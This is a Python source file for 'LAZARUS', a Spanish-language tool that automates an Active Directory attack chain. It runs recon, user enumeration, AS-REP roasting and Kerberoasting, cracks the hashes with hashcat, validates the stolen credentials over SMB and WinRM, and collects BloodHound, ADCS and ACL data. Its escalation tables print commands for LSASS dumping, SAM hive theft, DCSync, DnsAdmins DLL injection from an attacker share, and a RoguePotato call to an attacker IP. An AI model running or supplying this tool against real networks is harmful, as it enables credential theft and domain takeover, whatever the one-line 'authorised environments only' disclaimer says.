#!/usr/bin/env python3
"""
██╗      █████╗ ███████╗ █████╗ ██████╗ ██╗   ██╗███████╗
██║     ██╔══██╗╚════██║██╔══██╗██╔══██╗██║   ██║██╔════╝
██║     ███████║    ██╔╝███████║██████╔╝██║   ██║███████╗
██║     ██╔══██║   ██╔╝ ██╔══██║██╔══██╗██║   ██║╚════██║
███████╗██║  ██║   ██║  ██║  ██║██║  ██║╚██████╔╝███████║
╚══════╝╚═╝  ╚═╝   ╚═╝  ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝

AD Attack Chain Automation · DonTrebor1
Solo para entornos controlados y autorizados.
"""

import argparse
import json
import os
import shlex
import subprocess
import sys
from dataclasses import asdict, dataclass, field
from datetime import datetime
from pathlib import Path

# ─────────────────────────────────────────────────────────────────
# COLORES
# ─────────────────────────────────────────────────────────────────
class C:
    RESET   = "\033[0m"
    BOLD    = "\033[1m"
    DIM     = "\033[2m"
    GREEN   = "\033[92m"
    RED     = "\033[91m"
    YELLOW  = "\033[93m"
    CYAN    = "\033[96m"
    VIOLET  = "\033[95m"
    WHITE   = "\033[97m"
    BG_DARK = "\033[48;5;235m"

# ─────────────────────────────────────────────────────────────────
# HELPERS DE PRESENTACIÓN VISUAL
# ─────────────────────────────────────────────────────────────────
WIDTH = 72

def banner():
    print(f"""{C.GREEN}{C.BOLD}
██╗      █████╗ ███████╗ █████╗ ██████╗ ██╗   ██╗███████╗
██║     ██╔══██╗╚════██║██╔══██╗██╔══██╗██║   ██║██╔════╝
██║     ███████║    ██╔╝███████║██████╔╝██║   ██║███████╗
██║     ██╔══██║   ██╔╝ ██╔══██║██╔══██╗██║   ██║╚════██║
███████╗██║  ██║   ██║  ██║  ██║██║  ██║╚██████╔╝███████║
╚══════╝╚═╝  ╚═╝   ╚═╝  ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝{C.RESET}
{C.DIM}  AD Attack Chain Automation · whynotplay1{C.RESET}
{C.DIM}  Solo para entornos controlados y autorizados.{C.RESET}
""")

def phase_header(number: int, title: str, opsec: str):
    """Cabecera visual de fase con separador claro."""
    opsec_colors = {"LOW": C.GREEN, "MEDIUM": C.YELLOW, "HIGH": C.RED}
    opsec_color  = opsec_colors.get(opsec, C.YELLOW)
    line = "─" * WIDTH
    print(f"\n{C.CYAN}{line}{C.RESET}")
    print(f"{C.CYAN}{C.BOLD}  FASE {number:02d}  ·  {title.upper()}{C.RESET}")
    print(f"  {C.DIM}OPSEC:{C.RESET} {opsec_color}{opsec}{C.RESET}")
    print(f"{C.CYAN}{line}{C.RESET}")

def cmd_box(cmd: str):
    """Muestra el comando en una caja diferenciada."""
    print(f"\n  {C.DIM}┌─ CMD {'─' * (WIDTH - 8)}┐{C.RESET}")
    # Partir líneas largas
    words = cmd.split()
    line = ""
    for word in words:
        if len(line) + len(word) > WIDTH - 6:
            print(f"  {C.DIM}│{C.RESET}  {C.WHITE}{line}{C.RESET}")
            line = word + " "
        else:
            line += word + " "
    if line.strip():
        print(f"  {C.DIM}│{C.RESET}  {C.WHITE}{line.strip()}{C.RESET}")
    print(f"  {C.DIM}└{'─' * (WIDTH - 4)}┘{C.RESET}\n")

def finding(msg: str):
    """Hallazgo importante — resaltado en verde con icono."""
    print(f"\n  {C.GREEN}{C.BOLD}╔══ FINDING {'═' * (WIDTH - 14)}╗{C.RESET}")
    print(f"  {C.GREEN}{C.BOLD}║{C.RESET}  ✔  {msg}")
    print(f"  {C.GREEN}{C.BOLD}╚{'═' * (WIDTH - 4)}╝{C.RESET}\n")

def alert(msg: str):
    """Vector de escalada crítico — resaltado en rojo."""
    print(f"\n  {C.RED}{C.BOLD}╔══ ESCALADA {'═' * (WIDTH - 15)}╗{C.RESET}")
    print(f"  {C.RED}{C.BOLD}║{C.RESET}  ⚠  {msg}")
    print(f"  {C.RED}{C.BOLD}╚{'═' * (WIDTH - 4)}╝{C.RESET}\n")

def info(msg: str):
    ts = datetime.now().strftime("%H:%M:%S")
    print(f"  {C.DIM}{ts}{C.RESET}  {C.CYAN}·{C.RESET}  {msg}")

def warn(msg: str):
    ts = datetime.now().strftime("%H:%M:%S")
    print(f"  {C.DIM}{ts}{C.RESET}  {C.YELLOW}!{C.RESET}  {msg}")

def ok(msg: str):
    ts = datetime.now().strftime("%H:%M:%S")
    print(f"  {C.DIM}{ts}{C.RESET}  {C.GREEN}✔{C.RESET}  {msg}")

def err(msg: str):
    ts = datetime.now().strftime("%H:%M:%S")
    print(f"  {C.DIM}{ts}{C.RESET}  {C.RED}✘{C.RESET}  {msg}")

def section_end():
    print(f"  {C.DIM}{'─' * WIDTH}{C.RESET}")

# ─────────────────────────────────────────────────────────────────
# MAPA DE PRIVILEGIOS Y GRUPOS → VECTORES
# ─────────────────────────────────────────────────────────────────
PRIV_ATTACKS = {
    "SeImpersonatePrivilege": [
        ("CRÍTICO", "PrintSpoofer",  "PrintSpoofer64.exe -i -c cmd"),
        ("CRÍTICO", "GodPotato",     "GodPotato.exe -cmd 'cmd /c whoami'"),
        ("CRÍTICO", "RoguePotato",   "RoguePotato.exe -r <ATTACKER_IP> -e 'cmd.exe'"),
    ],
    "SeBackupPrivilege": [
        ("ALTO", "NTDS.dit dump", "reg save HKLM\\SYSTEM system.bak && reg save HKLM\\SAM sam.bak"),
        ("ALTO", "File read ACL bypass", "robocopy /b <SRC> <DST> <FILE>"),
    ],
    "SeDebugPrivilege": [
        ("ALTO", "LSASS dump", "rundll32.exe comsvcs.dll MiniDump <LSASS_PID> lsass.dmp full"),
    ],
    "SeTakeOwnershipPrivilege": [
        ("MEDIO", "Tomar propiedad de archivo sensible", "takeown /f C:\\Windows\\System32\\config\\SAM"),
    ],
    "SeLoadDriverPrivilege": [
        ("ALTO", "Driver exploit", "Eoploaddriver / Capcom"),
    ],
    "SeRestorePrivilege": [
        ("ALTO", "Modificar archivos del sistema", "Restaurar archivos arbitrarios sobre rutas protegidas"),
    ],
}

GROUP_ATTACKS = {
    "Domain Admins":     [("CRÍTICO", "Ya eres DA → DCSync",          "impacket-secretsdump -just-dc <DOMAIN>/<USER>:<PASS>@<DC>")],
    "Backup Operators":  [("ALTO",    "NTDS.dit via SeBackupPrivilege","Ver SeBackupPrivilege")],
    "DnsAdmins":         [("ALTO",    "DLL injection en DNS Service",  "dnscmd /config /serverlevelplugindll \\\\<ATTACKER>\\share\\evil.dll")],
    "Account Operators": [("MEDIO",   "Crear/modificar cuentas",       "net user newadmin P@ss /add")],
    "Server Operators":  [("ALTO",    "Modificar servicios del sistema","sc config <SVC> binPath= 'cmd /c <PAYLOAD>'")],
    "Remote Management Users": [("BAJO","Acceso WinRM",                "evil-winrm -i <TARGET> -u <USER> -p <PASS>")],
}

# ─────────────────────────────────────────────────────────────────
# CONTEXTO — Estado persistente
# ─────────────────────────────────────────────────────────────────
@dataclass
class LazarusContext:
    target:        str  = ""
    domain:        str  = ""
    dc_ip:         str  = ""
    username:      str  = ""
    password:      str  = ""
    nt_hash:       str  = ""
    output_dir:    str  = ""
    start_time:    str  = field(default_factory=lambda: datetime.now().isoformat())
    open_ports:    list = field(default_factory=list)
    users:         list = field(default_factory=list)
    asrep_hashes:  dict = field(default_factory=dict)
    kerb_hashes:   dict = field(default_factory=dict)
    cracked_creds: dict = field(default_factory=dict)
    valid_creds:   list = field(default_factory=list)
    privileges:    list = field(default_factory=list)
    groups:        dict = field(default_factory=dict)
    adcs_vulns:    list = field(default_factory=list)
    dmsa_vulns:    list = field(default_factory=list)
    acl_findings:  list = field(default_factory=list)
    phases_done:   list = field(default_factory=list)

    def save(self):
        path = Path(self.output_dir) / "lazarus_state.json"
        with open(path, "w") as f:
            json.dump(asdict(self), f, indent=2)
        ok(f"Estado guardado → {path}")

    @classmethod
    def load(cls, path: str) -> "LazarusContext":
        with open(path) as f:
            data = json.load(f)
        ctx = cls(**data)
        ok(f"Sesión restaurada desde {path}")
        return ctx

# ─────────────────────────────────────────────────────────────────
# RUNNER
# ─────────────────────────────────────────────────────────────────
class Runner:
    def __init__(self, ctx: LazarusContext):
        self.ctx = ctx

    def run(self, cmd: str, phase: str, timeout: int = 120) -> tuple[int, str]:
        cmd_box(cmd)
        out_path = Path(self.ctx.output_dir) / f"{phase}.txt"
        try:
            result = subprocess.run(
                cmd, shell=True, capture_output=True,
                text=True, timeout=timeout
            )
            combined = result.stdout + result.stderr
            with open(out_path, "a") as f:
                f.write(f"\n# [{datetime.now().isoformat()}] {cmd}\n")
                f.write(combined)
            return result.returncode, combined
        except subprocess.TimeoutExpired:
            warn(f"Timeout ({timeout}s) — continuando")
            return 1, ""
        except Exception as e:
            err(f"Error ejecutando comando: {e}")
            return 1, ""

# ─────────────────────────────────────────────────────────────────
# PARSERS
# ─────────────────────────────────────────────────────────────────
def parse_open_ports(nmap_output: str) -> list:
    ports = []
    for line in nmap_output.splitlines():
        if "/tcp" in line and "open" in line:
            try:
                ports.append(int(line.split("/")[0].strip()))
            except ValueError:
                pass
    return ports

def parse_rid_users(output: str) -> list:
    users = []
    for line in output.splitlines():
        if "SidTypeUser" in line:
            parts = line.split("\\")
            if len(parts) >= 2:
                user = parts[-1].split(" ")[0].strip()
                if user and "$" not in user:
                    users.append(user)
    return list(set(users))

def parse_asrep_hashes(output: str) -> dict:
    hashes = {}
    current_user = None
    for line in output.splitlines():
        if "User:" in line:
            current_user = line.split("User:")[1].split()[0].strip()
        if "$krb5asrep$" in line:
            hash_val = line.strip()
            if current_user:
                hashes[current_user] = hash_val
    return hashes

def parse_kerb_hashes(output: str) -> dict:
    hashes = {}
    current_user = None
    for line in output.splitlines():
        if "MemberName:" in line:
            current_user = line.split("MemberName:")[1].strip().split("@")[0]
        if "$krb5tgs$" in line and current_user:
            hashes[current_user] = line.strip()
    return hashes

def parse_cracked(pot_output: str) -> dict:
    creds = {}
    for line in pot_output.splitlines():
        if ":" in line:
            parts = line.strip().rsplit(":", 1)
            if len(parts) == 2:
                creds[parts[0]] = parts[1]
    return creds

def parse_privileges(output: str) -> list:
    privs = []
    for line in output.splitlines():
        if "Se" in line and "Enabled" in line:
            priv = line.strip().split()[0]
            privs.append(priv)
    return privs

def parse_groups(output: str) -> list:
    groups = []
    for line in output.splitlines():
        if "=" in line and any(g in line for g in ["Admins", "Operators", "Users", "Management"]):
            parts = line.split("=")
            if len(parts) >= 2:
                group = parts[1].strip()
                if group:
                    groups.append(group)
    return groups

# ─────────────────────────────────────────────────────────────────
# LAZARUS CHAIN
# ─────────────────────────────────────────────────────────────────
class LazarusChain:
    def __init__(self, ctx: LazarusContext):
        self.ctx = ctx
        self.runner = Runner(ctx)

    def phase_recon(self):
        phase_header(1, "Reconocimiento", "MEDIUM")
        info("Escaneando puertos AD con nmap...")

        cmd = (f"nmap -sV -sC "
               f"-p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 "
               f"{self.ctx.target} -oN {self.ctx.output_dir}/nmap.txt")
        rc, out = self.runner.run(cmd, "nmap", timeout=180)

        ports = parse_open_ports(out)
        self.ctx.open_ports = ports

        if ports:
            ok(f"Puertos abiertos: {C.GREEN}{ports}{C.RESET}")
        if 88 in ports and 389 in ports:
            self.ctx.dc_ip = self.ctx.dc_ip or self.ctx.target
            finding(f"Domain Controller confirmado en {self.ctx.dc_ip} (Kerberos:88 + LDAP:389)")
        if 445 in ports:
            ok("SMB disponible en puerto 445")
        if 5985 in ports:
            ok("WinRM disponible en puerto 5985 — posible shell remota")

        section_end()
        self.ctx.phases_done.append("recon")
        self.ctx.save()

    def phase_enum_users(self):
        phase_header(2, "Enumeración de usuarios", "MEDIUM")
        info("RID brute + LDAP anónimo...")

        users = []
        cmd_rid = f"netexec smb {self.ctx.target} --rid-brute 2>/dev/null"
        rc, out = self.runner.run(cmd_rid, "enum_users", timeout=120)
        users += parse_rid_users(out)

        cmd_ldap = f"netexec ldap {self.ctx.target} -u '' -p '' --users 2>/dev/null"
        rc2, out2 = self.runner.run(cmd_ldap, "enum_users", timeout=60)
        users += parse_rid_users(out2)

        users = list(set(users))
        self.ctx.users = users

        if users:
            users_file = Path(self.ctx.output_dir) / "users.txt"
            users_file.write_text("\n".join(users))
            finding(f"{len(users)} usuarios enumerados → {users_file}")
            for u in users[:10]:
                print(f"      {C.GREEN}→{C.RESET}  {u}")
            if len(users) > 10:
                print(f"      {C.DIM}... y {len(users)-10} más (ver users.txt){C.RESET}")
        else:
            warn("Sin usuarios. Proporciona lista con --users")

        section_end()
        self.ctx.phases_done.append("enum_users")
        self.ctx.save()

    def phase_asrep(self):
        phase_header(3, "AS-REP Roasting", "MEDIUM")
        info("Buscando usuarios sin pre-autenticación Kerberos...")

        if not self.ctx.users:
            warn("Sin lista de usuarios — saltando fase")
            return

        users_file = Path(self.ctx.output_dir) / "users.txt"
        out_file   = Path(self.ctx.output_dir) / "asrep_hashes.txt"
        cmd = (f"impacket-GetNPUsers {self.ctx.domain}/ "
               f"-usersfile {users_file} -no-pass "
               f"-dc-ip {self.ctx.dc_ip or self.ctx.target} "
               f"-outputfile {out_file} 2>/dev/null")
        rc, out = self.runner.run(cmd, "asrep", timeout=120)

        hashes = parse_asrep_hashes(out)
        if out_file.exists():
            hashes.update(parse_asrep_hashes(out_file.read_text()))

        self.ctx.asrep_hashes = hashes
        if hashes:
            finding(f"AS-REP hashes obtenidos para: {list(hashes.keys())}")
            for user, h in hashes.items():
                print(f"      {C.GREEN}→{C.RESET}  {C.BOLD}{user}{C.RESET}")
                print(f"         {C.DIM}{h[:80]}...{C.RESET}")
        else:
            info("Sin usuarios AS-REP vulnerables")

        section_end()
        self.ctx.phases_done.append("asrep")
        self.ctx.save()

    def phase_kerberoast(self):
        phase_header(4, "Kerberoasting", "MEDIUM")
        info("Buscando cuentas de servicio con SPN...")

        if not self.ctx.username or not (self.ctx.password or self.ctx.nt_hash):
            warn("Sin credenciales — saltando fase. Usa --creds o --hash")
            return

        auth = (f"-hashes :{self.ctx.nt_hash}" if self.ctx.nt_hash
                else f"-p {shlex.quote(self.ctx.password)}")
        out_file = Path(self.ctx.output_dir) / "kerb_hashes.txt"
        cmd = (f"impacket-GetUserSPNs {self.ctx.domain}/{self.ctx.username} "
               f"{auth} -dc-ip {self.ctx.dc_ip or self.ctx.target} "
               f"-outputfile {out_file} 2>/dev/null")
        rc, out = self.runner.run(cmd, "kerberoast", timeout=120)

        hashes = parse_kerb_hashes(out)
        if out_file.exists():
            hashes.update(parse_kerb_hashes(out_file.read_text()))

        self.ctx.kerb_hashes = hashes
        if hashes:
            finding(f"Kerberoastable accounts: {list(hashes.keys())}")
        else:
            info("Sin cuentas Kerberoastables")

        section_end()
        self.ctx.phases_done.append("kerberoast")
        self.ctx.save()

    def phase_crack(self, wordlist: str = "/usr/share/wordlists/rockyou.txt"):
        phase_header(5, "Cracking de hashes", "LOW")
        info(f"Wordlist: {wordlist}")
        info("Proceso local — sin tráfico de red")

        cracked = {}

        if self.ctx.asrep_hashes:
            asrep_file = Path(self.ctx.output_dir) / "asrep_hashes.txt"
            if not asrep_file.exists():
                asrep_file.write_text("\n".join(self.ctx.asrep_hashes.values()))
            pot_file = Path(self.ctx.output_dir) / "asrep.pot"
            cmd = f"hashcat -m 18200 {asrep_file} {wordlist} --potfile-path {pot_file} -q 2>/dev/null"
            self.runner.run(cmd, "crack", timeout=300)
            if pot_file.exists():
                cracked.update(parse_cracked(pot_file.read_text()))

        if self.ctx.kerb_hashes:
            kerb_file = Path(self.ctx.output_dir) / "kerb_hashes.txt"
            if not kerb_file.exists():
                kerb_file.write_text("\n".join(self.ctx.kerb_hashes.values()))
            pot_file = Path(self.ctx.output_dir) / "kerb.pot"
            cmd = f"hashcat -m 13100 {kerb_file} {wordlist} --potfile-path {pot_file} -q 2>/dev/null"
            self.runner.run(cmd, "crack", timeout=300)
            if pot_file.exists():
                cracked.update(parse_cracked(pot_file.read_text()))

        self.ctx.cracked_creds = cracked

        if cracked:
            finding(f"Contraseñas crackeadas: {cracked}")
            for user, passwd in cracked.items():
                print(f"      {C.GREEN}→{C.RESET}  {C.BOLD}{user}{C.RESET}  :  {C.GREEN}{C.BOLD}{passwd}{C.RESET}")
            if not self.ctx.username:
                first = list(cracked.keys())[0]
                self.ctx.username = first
                self.ctx.password = cracked[first]
                ok(f"Usando credencial: {self.ctx.username}:{self.ctx.password}")
        else:
            warn("Sin contraseñas crackeadas con rockyou.txt")

        section_end()
        self.ctx.phases_done.append("crack")
        self.ctx.save()

    def phase_validate(self):
        phase_header(6, "Validación de credenciales", "MEDIUM")

        if not self.ctx.username:
            warn("Sin credenciales — saltando fase")
            return

        creds_to_test = [(self.ctx.username, self.ctx.password or "")]
        creds_to_test += [(u, p) for u, p in self.ctx.cracked_creds.items()]

        valid = []
        for user, passwd in creds_to_test:
            auth = (f"--hash {self.ctx.nt_hash}" if self.ctx.nt_hash and not passwd
                    else f"-p {shlex.quote(passwd)}")

            cmd_smb = f"netexec smb {self.ctx.target} -u {shlex.quote(user)} {auth} 2>/dev/null"
            rc, out = self.runner.run(cmd_smb, "validate", timeout=30)
            if "[+]" in out and "STATUS_LOGON_FAILURE" not in out:
                finding(f"SMB válido → {user}:{passwd}")
                valid.append((user, passwd, "smb"))

            cmd_winrm = f"netexec winrm {self.ctx.target} -u {shlex.quote(user)} {auth} 2>/dev/null"
            rc2, out2 = self.runner.run(cmd_winrm, "validate", timeout=30)
            if "Pwn3d!" in out2 or ("[+]" in out2 and "STATUS_LOGON_FAILURE" not in out2):
                finding(f"WinRM válido — shell disponible para {user}")
                print(f"\n      {C.GREEN}{C.BOLD}evil-winrm -i {self.ctx.target} -u {user} -p '{passwd}'{C.RESET}\n")
                valid.append((user, passwd, "winrm"))

        self.ctx.valid_creds = [list(v) for v in valid]
        if not valid:
            warn("Sin credenciales válidas")

        section_end()
        self.ctx.phases_done.append("validate")
        self.ctx.save()

    def phase_post_enum(self):
        phase_header(7, "Enumeración post-acceso", "MEDIUM")

        if not self.ctx.username:
            warn("Sin credenciales — saltando fase")
            return

        auth_smb = (f"--hash {self.ctx.nt_hash}" if self.ctx.nt_hash
                    else f"-p {shlex.quote(self.ctx.password or '')}")
        auth_imp = (f"-hashes :{self.ctx.nt_hash}" if self.ctx.nt_hash
                    else f"-p {shlex.quote(self.ctx.password or '')}")

        # whoami /all
        info("Obteniendo privilegios y grupos...")
        cmd_who = (f"netexec smb {self.ctx.target} "
                   f"-u {shlex.quote(self.ctx.username)} {auth_smb} "
                   f"-x 'whoami /all' 2>/dev/null")
        rc, out = self.runner.run(cmd_who, "post_enum", timeout=60)
        privs  = parse_privileges(out)
        groups = parse_groups(out)
        self.ctx.privileges = privs
        self.ctx.groups[self.ctx.username] = groups

        if privs:
            ok(f"Privilegios detectados: {C.YELLOW}{privs}{C.RESET}")
        if groups:
            ok(f"Grupos: {C.YELLOW}{groups}{C.RESET}")

        # SMB shares
        info("Enumerando shares SMB...")
        cmd_shares = (f"netexec smb {self.ctx.target} "
                      f"-u {shlex.quote(self.ctx.username)} {auth_smb} "
                      f"--shares 2>/dev/null")
        self.runner.run(cmd_shares, "smb_shares", timeout=60)

        # BloodHound
        if self.ctx.domain:
            info("Recolectando datos para BloodHound...")
            cmd_bh = (f"bloodhound-python "
                      f"-u {shlex.quote(self.ctx.username)} {auth_imp} "
                      f"-d {self.ctx.domain} "
                      f"-dc {self.ctx.dc_ip or self.ctx.target} "
                      f"-c All --zip -o {self.ctx.output_dir} 2>/dev/null")
            self.runner.run(cmd_bh, "bloodhound", timeout=300)

        # ADCS
        if self.ctx.domain:
            info("Buscando vulnerabilidades ADCS (ESC1-8)...")
            cmd_adcs = (f"certipy find "
                        f"-u {shlex.quote(self.ctx.username)}@{self.ctx.domain} "
                        f"{auth_imp} "
                        f"-dc-ip {self.ctx.dc_ip or self.ctx.target} "
                        f"-stdout 2>/dev/null")
            rc_adcs, out_adcs = self.runner.run(cmd_adcs, "adcs", timeout=120)
            if "ESC" in out_adcs:
                vulns = [l.strip() for l in out_adcs.splitlines() if "ESC" in l]
                self.ctx.adcs_vulns = vulns
                finding(f"Vulnerabilidades ADCS: {vulns}")

        # dMSA / BadSuccessor
        info("Buscando objetos dMSA (BadSuccessor)...")
        cmd_dmsa = (f"netexec ldap {self.ctx.target} "
                    f"-u {shlex.quote(self.ctx.username)} {auth_smb} "
                    f"-M msa 2>/dev/null")
        rc_dmsa, out_dmsa = self.runner.run(cmd_dmsa, "dmsa", timeout=60)
        if "dMSA" in out_dmsa or "msDS-DelegatedMSAState" in out_dmsa:
            self.ctx.dmsa_vulns.append(out_dmsa[:300])
            finding("Posible BadSuccessor/dMSA — revisar dmsa.txt")

        # ACLs
        info("Analizando ACLs peligrosas...")
        cmd_acl = (f"impacket-dacledit {self.ctx.domain}/{self.ctx.username} "
                   f"{auth_imp} "
                   f"-dc-ip {self.ctx.dc_ip or self.ctx.target} "
                   f"-action dump 2>/dev/null | head -50")
        rc_acl, out_acl = self.runner.run(cmd_acl, "acl", timeout=90)
        if any(x in out_acl for x in ["WriteDacl", "GenericAll", "GenericWrite"]):
            self.ctx.acl_findings.append(out_acl[:500])
            finding("ACLs peligrosas detectadas — revisar acl.txt")

        section_end()
        self.ctx.phases_done.append("post_enum")
        self.ctx.save()

    def phase_analyze(self):
        phase_header(8, "Análisis y vectores de escalada", "—")
        found_any = False

        for priv in self.ctx.privileges:
            if priv in PRIV_ATTACKS:
                found_any = True
                for severity, name, cmd in PRIV_ATTACKS[priv]:
                    alert(f"[{severity}]  {priv}  →  {name}")
                    print(f"      {C.DIM}Comando:{C.RESET}")
                    print(f"      {C.WHITE}{cmd}{C.RESET}\n")

        for user, grps in self.ctx.groups.items():
            for grp in grps:
                for group_key, attacks in GROUP_ATTACKS.items():
                    if group_key.lower() in grp.lower():
                        found_any = True
                        for severity, desc, cmd in attacks:
                            alert(f"[{severity}]  {user} ∈ {group_key}  →  {desc}")
                            print(f"      {C.DIM}Comando:{C.RESET}")
                            print(f"      {C.WHITE}{cmd}{C.RESET}\n")

        for vuln in self.ctx.adcs_vulns:
            found_any = True
            alert(f"[ALTO]  ADCS  →  {vuln}")
            print(f"      {C.DIM}Comando:{C.RESET}")
            print(f"      {C.WHITE}certipy req -u {self.ctx.username}@{self.ctx.domain} -p '{self.ctx.password}' -dc-ip {self.ctx.dc_ip} -template <TEMPLATE> -ca <CA>{C.RESET}\n")

        if self.ctx.dmsa_vulns:
            found_any = True
            alert("[ALTO]  BadSuccessor/dMSA  →  Abuso de delegated MSA")
            print(f"      {C.DIM}Revisar dmsa.txt para detalles del objeto vulnerable.{C.RESET}\n")

        if self.ctx.acl_findings:
            found_any = True
            alert("[ALTO]  ACLs peligrosas  →  WriteDacl / GenericAll / GenericWrite")
            print(f"      {C.DIM}Revisar acl.txt y usar dacledit para abuso de ACL.{C.RESET}\n")

        if not found_any:
            warn("Sin vectores de escalada detectados automáticamente.")
            info("Carga el ZIP de BloodHound manualmente para análisis visual.")

        section_end()
        self.ctx.phases_done.append("analyze")
        self.ctx.save()

# ─────────────────────────────────────────────────────────────────
# MODO PLAN
# ─────────────────────────────────────────────────────────────────
def run_plan_mode(target: str, domain: str):
    line = "─" * WIDTH
    print(f"\n{C.VIOLET}{C.BOLD}{line}{C.RESET}")
    print(f"{C.VIOLET}{C.BOLD}  LAZARUS — PLAN DE ATAQUE  (sin ejecución){C.RESET}")
    print(f"{C.VIOLET}{C.BOLD}{line}{C.RESET}")

    phases = [
        ("01", "Reconocimiento",              "MEDIUM",
         f"nmap -sV -sC -p 53,88,135,139,389,445,5985 {target}"),
        ("02", "Enumeración de usuarios",     "MEDIUM",
         f"netexec smb {target} --rid-brute"),
        ("03", "AS-REP Roasting",             "MEDIUM",
         f"impacket-GetNPUsers {domain}/ -usersfile users.txt -no-pass"),
        ("04", "Kerberoasting",               "MEDIUM",
         f"impacket-GetUserSPNs {domain}/<USER> -p <PASS>"),
        ("05", "Cracking",                    "LOW",
         "hashcat -m 18200 asrep_hashes.txt rockyou.txt"),
        ("06", "Validación de credenciales",  "MEDIUM",
         f"netexec smb {target} -u <USER> -p <PASS>"),
        ("07", "Post-enum + ADCS + ACLs",     "MEDIUM",
         "BloodHound + certipy + dacledit + dMSA"),
        ("08", "Análisis y escalada",         "—",
         "Análisis automático de privesc/grupos/ADCS/ACLs"),
    ]

    for num, title, opsec, cmd in phases:
        opsec_colors = {"LOW": C.GREEN, "MEDIUM": C.YELLOW, "HIGH": C.RED, "—": C.DIM}
        oc = opsec_colors.get(opsec, C.DIM)
        print(f"\n  {C.CYAN}{C.BOLD}FASE {num}{C.RESET}  ·  {title}")
        print(f"  {C.DIM}OPSEC:{C.RESET} {oc}{opsec}{C.RESET}")
        print(f"  {C.DIM}┌─ CMD ──────────────────────────────────────────────────┐{C.RESET}")
        print(f"  {C.DIM}│{C.RESET}  {C.WHITE}{cmd}{C.RESET}")
        print(f"  {C.DIM}└────────────────────────────────────────────────────────┘{C.RESET}")

    print(f"\n{C.VIOLET}{C.BOLD}{line}{C.RESET}\n")

# ─────────────────────────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────────────────────────
def main():
    banner()

    parser = argparse.ArgumentParser(
        description="LAZARUS — AD Attack Chain Automation · whynotplay1",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument("-t", "--target",  help="IP del Domain Controller / target")
    parser.add_argument("-d", "--domain",  help="FQDN del dominio (ej: corp.local)")
    parser.add_argument("--dc-ip",         help="IP del DC si difiere del target")
    parser.add_argument("--creds",         help="Credenciales: 'usuario:contraseña'")
    parser.add_argument("--hash",          help="Pass-the-Hash: 'usuario:NThash'")
    parser.add_argument("--users",         help="Fichero con lista de usuarios")
    parser.add_argument("--wordlist",      help="Wordlist para hashcat",
                        default="/usr/share/wordlists/rockyou.txt")
    parser.add_argument("--auto",          action="store_true",
                        help="Ejecutar todas las fases automáticamente")
    parser.add_argument("--plan",          action="store_true",
                        help="Mostrar plan de ataque sin ejecutar nada")
    parser.add_argument("--resume",        help="Reanudar desde fichero de estado")
    parser.add_argument("--reanalyze",     action="store_true",
                        help="Re-ejecutar solo el análisis de escalada")
    parser.add_argument("-o", "--output",  help="Carpeta de output",
                        default="lazarus_output")

    args = parser.parse_args()

    if args.plan:
        run_plan_mode(args.target or "<TARGET>", args.domain or "<DOMAIN>")
        return

    if args.resume:
        ctx   = LazarusContext.load(args.resume)
        chain = LazarusChain(ctx)
        if args.reanalyze:
            chain.phase_analyze()
        return

    if not args.target:
        parser.error("Se requiere --target (-t)")

    output_dir = Path(args.output)
    output_dir.mkdir(exist_ok=True)
    ok(f"Output → {output_dir.resolve()}")

    ctx = LazarusContext(
        target=args.target,
        domain=args.domain or "",
        dc_ip=args.dc_ip or args.target,
        output_dir=str(output_dir),
    )

    if args.creds and ":" in args.creds:
        ctx.username, ctx.password = args.creds.split(":", 1)
        ok(f"Credenciales cargadas: {ctx.username}")

    if args.hash and ":" in args.hash:
        parts = args.hash.split(":")
        ctx.username = parts[0]
        ctx.nt_hash  = parts[-1]
        ok(f"Hash PTH cargado: {ctx.username}")

    if args.users and Path(args.users).exists():
        ctx.users = [u.strip() for u in Path(args.users).read_text().splitlines() if u.strip()]
        ok(f"Lista de usuarios cargada: {len(ctx.users)} usuarios")

    chain = LazarusChain(ctx)

    if args.auto:
        chain.phase_recon()
        chain.phase_enum_users()
        chain.phase_asrep()
        chain.phase_kerberoast()
        chain.phase_crack(args.wordlist)
        chain.phase_validate()
        chain.phase_post_enum()
        chain.phase_analyze()

        line = "═" * WIDTH
        print(f"\n{C.GREEN}{C.BOLD}{line}{C.RESET}")
        print(f"{C.GREEN}{C.BOLD}  LAZARUS — CADENA COMPLETA EJECUTADA{C.RESET}")
        print(f"{C.GREEN}{C.BOLD}{line}{C.RESET}")
        print(f"  Output guardado en: {C.WHITE}{output_dir.resolve()}{C.RESET}")
        print(f"  Reanudar con:       {C.WHITE}python3 lazarus.py --resume {output_dir}/lazarus_state.json{C.RESET}")
        print(f"{C.GREEN}{C.BOLD}{line}{C.RESET}\n")
    else:
        warn("Sin --auto ni --plan.")
        info("Ejemplo: python3 lazarus.py -t 10.10.11.x -d corp.local --auto")

if __name__ == "__main__":
    main()
